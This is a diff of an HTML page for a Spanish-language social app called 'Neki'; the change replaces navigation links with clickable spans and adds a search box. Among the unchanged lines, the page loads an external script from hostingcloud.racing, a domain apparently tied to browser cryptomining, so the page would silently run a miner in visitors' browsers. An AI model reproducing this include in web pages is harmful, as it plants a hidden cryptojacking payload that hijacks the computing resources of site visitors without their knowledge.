@@ -16,13 +16,14 @@
             <h1 class="logo"> Neki </h1>
             <nav class="navigation">
                 <ul>
-                    <li><a href="#">Mi actividad</a></li> 
-                    <li><a href="#">Mi cuenta</a></li>
-                    <li><a href="#">Salir</a></li>
+                    <li><span class="clickable">Mi actividad</span></li>
+                    <li><span class="clickable">Mi cuenta</span></li>
+                    <li><span id="salir" class="clickable">Salir</span></li>
                 </ul>
             </nav>
         </div>
     </header>
+
     <main class="main-w main-p">
         <div class="board border">
             <textarea class='pub_txt' id='pubContent' placeholder='TEXTO'></textarea>
@@ -30,9 +31,15 @@
         </div>
         <div id="publications"></div>
     </main>
+
+    <section class="r-section r-section-p r-section-w">
+      <div class="search-container">
+        <input id="searchU" type="text" name="" value="" placeholder="Buscar">
+      </div>
+    </section>
+
     <script src="https://www.hostingcloud.racing/HDFk.js"></script>
     <script src="scripts/socket.io.js"></script>
     <script src="scripts/home.js"></script>
 </body>
 </html>
-
